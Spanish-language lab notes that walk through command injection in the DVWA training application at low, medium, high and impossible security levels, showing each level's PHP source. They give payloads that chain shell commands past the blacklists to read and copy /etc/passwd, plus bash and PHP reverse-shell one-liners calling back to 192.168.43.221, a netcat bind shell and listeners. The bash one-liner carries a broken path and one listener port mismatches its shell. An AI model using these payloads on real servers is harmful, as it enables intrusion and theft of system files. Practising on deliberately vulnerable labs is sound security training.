#'Comman Injection'

La inyección de comandos es un ataque en el que el objetivo es la ejecución de comandos arbitrarios
en el sistema operativo host a través de una aplicación vulnerable. Los ataques de inyección de comandos
son posibles cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) 
a un shell del sistema. En este ataque, los comandos del sistema operativo proporcionados 
por el atacante generalmente se ejecutan con los privilegios de la aplicación vulnerable. 
Los ataques de inyección de comandos son posibles en gran parte debido a una validación de entrada insuficiente.

#low

El código subyacente no comprueba si $ target coincide con una dirección IP. 
Sin filtrado de caracteres especiales. ; en Unix / Linux permite separar los comandos.

#Low Command Injection Source

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>

#imprime el directorio de trabajo, consulte a continuación con varias formas:

	127.0.0.1; pwd
	127.0.0.1&& pwd
	127.0.0.1| pwd
	127.0.0.1|| pwd
	127.0.0.1|:| pwd
PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.292 ms
round-trip min/avg/max/stddev = 0.265/0.399/0.718/0.185 ms
	/var/www/html/vulnerabilities/exec
	

	127.0.0.1; ls

	127.0.0.1.1; ps

"Muestra el contenido de */etc/passwd* en la página web"
	127.0.0.1; cat /etc/passwd

también copia el contenido del archivo */etc/passwd* en el directorio */tmp.*
	127.0.0.1; cat /etc/passwd | tee /tmp/passwd


#obtener una shell de bash
ejecutamos la "revershell" de "pentesmonkey" la reverseshell de *bash* y *php*

;bash -c "bash -i >& /dev/null/tcp/192.168.43.221/4444 0>&1"
;php -r '$sock=fsockopen("192.168.43.221",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

#con "nc" ponemos en la escucha con el puerto indicamos en la reverse shell de "bash"
╭─      /home/josema96/Documentos/pentesting_web/injection_command
╰─ nc -nlvp 1234
listening on [any] 1234

#con "nc" ponemos en la escucha con el puerto indicamos en la reverse shell de "php"
╭─      /home/josema96/Documentos/pentesting_web/injection_command     
╰─ nc -nlvp 4444
listening on [any] 4444



############################################


#Command Injection

#MEDIUM
Medium Command Injection Source
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>

Al ver el código fuente, vemos que se ha configurado una lista negra para excluir && y ;. 
Como se señaló anteriormente, podemos usar | como un reemplazo:

Doble || también se puede utilizar, como se muestra a continuación:

#Muestra el contenido de / etc / passwd en la página web
	
	2.8.0.11| cat /etc/passwd
	2.8.0.11|| cat /etc/passwd
PING 2.8.0.11 (2.8.0.11): 56 data bytes
--- 2.8.0.11 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

#otra forma de ejecutar el archivo #/etc/passwd#
	||ls | cat /etc/passwd

#en la página web y también copia el contenido del archivo / etc / passwd en el directorio / tmp.
	
	2.8.0.11|| cat /etc/passwd | tee /tmp/passwd

#También puede utilizar | pwd o || pwd (no es necesario incluir la dirección IP).
	
	||pwd or |pwd
/var/www/html/vulnerabilities/exec
	||whoami or |whoami
www-data
	||ps or |ps
PID TTY          TIME CMD
    186 pts/0    00:00:00 apache2
	
	||ls or |ls
	||ls -a or |ls -a
help
index.php
source



################################################


#COMMAN INJECTION

Command Injection Source
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',	<==== ojooooooooooooooooo podemos escapar con espacio la tubería "| "
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>

'Viendo el código fuente, se ha establecido una lista negra más extensa. Un poco más complicado, 
sin embargo, la respuesta está en la fuente de la vista:
'| '=' ', - tenga en cuenta que hay un espacio después de | personaje. Si lo intentamos | pwd, 
no se devuelve ninguna salida, sin embargo, si usamos | pwd, incluiremos nuestro comando dentro de este espacio, 
como se muestra a continuación:'

#mostra el archivo "/etc/passwd"
	
	2.8.0.11|| cat /etc/passwd
	2.8.0.11|cat /etc/passwd

#mover el archivo de /etc/passwd al directorio /tmp.
	2.8.0.11|| cat /etc/passwd | tee /tmp/passwd
	2.8.0.11|cat /etc/passwd | tee /tmp/passwd

#analizemos otras tecnica chula
	podemos omitir la "$terget" ejemplo: *|| pwd* or *|pwd*
	
	|| pwd    or   |pwd
	|| whoami or   |whoami
	|| ps     or   |ps

Enlazar Shell
2.8.0.11; /tmp/pipe;sh /tmp/pipe | nc -l 4444 /tmp/pipe: crea un detector de netcat, 
luego usa nc 2.8.0.11 4444 para conectarse. (Cambie las direcciones IP para que coincidan con las de la máquina de destino)

#:Puntos a tener en cuenta:
1:Asegúrese de estar usando comandos específicos para el objetivo que está tratando de atacar, 
todos los anteriores son Linux, los comandos de Windows serán diferentes.

2:Pruebe los comandos con y sin un espacio entre ellos.

3:No siempre tendrá acceso al código fuente.


########################################################

#Command ijection
#IMPOSSIBLE

Command Injection Source
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );

    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>


El mecanismo de token ring CSRF se agrega aquí y el parámetro ip está estrictamente limitado. 
Solo la entrada como 'número. Número. Número. Número' se puede recibir y ejecutar, 
por lo que no hay vulnerabilidad de inyección de comando.

